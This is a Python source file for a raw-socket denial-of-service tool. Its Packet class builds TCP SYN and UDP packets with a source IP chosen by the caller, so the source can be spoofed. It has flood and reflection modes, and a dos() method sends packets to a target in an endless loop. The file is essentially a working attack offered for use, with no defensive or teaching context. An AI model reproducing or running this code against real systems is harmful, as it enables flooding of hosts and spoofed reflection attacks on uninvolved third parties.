import socket
import struct
import time


class Packet:
    def __init__(self, protocol, dip, dport, sip, idip=None, type='None', timeout=0):
        self.__src_ip = f'{sip}'  # source ip address
        self.__dst_ip = f'{dip}' # destination ip
        self.__src_port = 4445  # you can change this, but it does not really matter
        self.__dst_port = int(dport)
        self.__idip = f'{idip}'
        self.__timeout = float(timeout)
        self.s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

        if protocol == 'TCP':
            ip_header, ip_src, ip_dst, ip_proto = self.__constructing_ip_header()
            tcp_header = self.__constructing_tcp_header(ip_src=ip_src, ip_dst=ip_dst, ip_proto=ip_proto)
            self.packet = ip_header + tcp_header

        elif protocol == 'UDP':
            if type == 'flood':
                ip_header, ip_src, ip_dst, ip_proto = self.__constructing_ip_header()
                udp_header = self.__constructing_udp_header()
                self.packet = ip_header + udp_header
            elif type == 'reflection':
                self.__src_ip = self.__dst_ip
                self.__dst_ip = self.__idip
                ip_header, ip_src, ip_dst, ip_proto = self.__constructing_ip_header()
                udp_header = self.__constructing_udp_header()
                self.packet = ip_header + udp_header



    def __constructing_ip_header(self):
        ip_ver = 4
        ip_ihl = 5
        ip_ttl = 64
        ip_proto = socket.IPPROTO_TCP
        ip_src = socket.inet_aton(self.__src_ip)
        ip_dst = socket.inet_aton(self.__dst_ip)
        ip_header = struct.pack('!BBHHHBBH4s4s', (ip_ver << 4) + ip_ihl, ip_ttl, 0, 0, 0, ip_proto, 0, 0, ip_src,
                                ip_dst)
        return ip_header, ip_src, ip_dst, ip_proto

    def __constructing_tcp_header(self, ip_src, ip_dst, ip_proto):
        tcp_src_port = self.__src_port
        tcp_dst_port = self.__dst_port
        tcp_seq = 1  # Replace with your desired sequence number
        tcp_ack_seq = 0
        tcp_offset_res = (5 << 4)
        tcp_flags = 2  # Flags: SYN - 0x02
        tcp_window = socket.htons(5840)  # Maximum allowed window size
        tcp_checksum = 0
        tcp_urg_ptr = 0

        tcp_header = struct.pack('!HHLLBBHHH', tcp_src_port, tcp_dst_port, tcp_seq, tcp_ack_seq, tcp_offset_res,
                                 tcp_flags, tcp_window, tcp_checksum, tcp_urg_ptr)
        pseudo_header = struct.pack('!4s4sBBH', ip_src, ip_dst, 0, ip_proto, len(tcp_header))
        pseudo_packet = pseudo_header + tcp_header

        tcp_checksum = 0
        for i in range(0, len(pseudo_packet), 2):
            tcp_checksum += (pseudo_packet[i] << 8) + pseudo_packet[i + 1]

        tcp_checksum = (tcp_checksum >> 16) + (tcp_checksum & 0xffff)
        tcp_checksum = tcp_checksum + (tcp_checksum >> 16)
        tcp_checksum = (~tcp_checksum) & 0xffff
        tcp_header = struct.pack('!HHLLBBHHH', tcp_src_port, tcp_dst_port, tcp_seq, tcp_ack_seq, tcp_offset_res,
                                 tcp_flags, tcp_window, tcp_checksum, tcp_urg_ptr)
        return tcp_header

    def __constructing_udp_header(self):
        udp_src_port = 4445
        udp_dst_port = self.__dst_port
        udp_length = 8
        udp_checksum = 0
        udp_header = struct.pack('!HHHH', udp_src_port, udp_dst_port, udp_length, udp_checksum)
        return udp_header

    def dos(self):
        packet = self.packet
        dst_ip = self.__dst_ip
        timer = self.__timeout
        try:
            while True:
                self.s.sendto(packet, (dst_ip, 0))
                time.sleep(timer)
        finally:
            self.s.close()